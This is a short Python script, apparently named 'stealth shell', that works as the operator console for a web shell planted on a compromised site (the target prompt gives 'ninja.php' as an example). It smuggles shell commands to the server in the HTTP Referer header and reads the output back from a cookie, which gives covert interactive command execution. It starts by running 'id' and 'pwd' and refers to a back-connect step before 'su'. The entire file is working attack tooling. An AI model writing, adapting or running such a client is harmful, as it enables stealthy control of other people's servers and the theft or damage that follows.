import requests
from urllib.parse import unquote
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(bcolors.FAIL + '''                                 
                    ,--,,-.----.    
  ,----..         ,--.'|\    /  \   
 /   /   \     ,--,  | :|   :    \  
|   :     : ,---.'|  : '|   |  .\ : 
.   |  ;. / |   | : _' |.   :  |: | 
.   ; /--`  :   : |.'  ||   |   \ : 
;   | ;  __ |   ' '  ; :|   : .   / 
|   : |.' .''   |  .'. |;   | |`-'  
.   | '_.' :|   | :  | '|   | ;     
'   ; : \  |'   : |  : ;:   ' |     
'   | '/  .'|   | '  ,/ :   : :     
|   :    /  ;   : ;--'  |   | :     
 \   \ .'   |   ,/      `---'.|     
  `---`     '---'         `---`     
  
  stealth shell 
''' + bcolors.ENDC)

def main():
    print("")
    getcwd = 'pwd'
    d = session.get(target, headers={"Referer":getcwd})
    cwd = unquote(d.cookies['x'].replace('+',' '))
    cmd = input(bcolors.FAIL + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + cwd)
    if cmd == "su":
        print("")
        print(bcolors.FAIL + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
        main()
    elif cmd == "exit":
        exit(0)
    elif not cmd:
        main()
    else:
        try:
            r=session.get(target, headers={"Referer":cmd})
            print(unquote(r.cookies['x'].replace('+',' ')))
            main()
        except:
            print(' ')
            main()




target = input("Target site (http://xxxxx.com/ninja.php) > ")
print('(type exit to exit)')
print('')
parsed_uri = urlparse(target)
domain = '{uri.netloc}'.format(uri=parsed_uri)

session = requests.Session()
r = session.head(target, headers={"Referer": "id"})
print("cookie: " + r.headers["Set-Cookie"])


main()
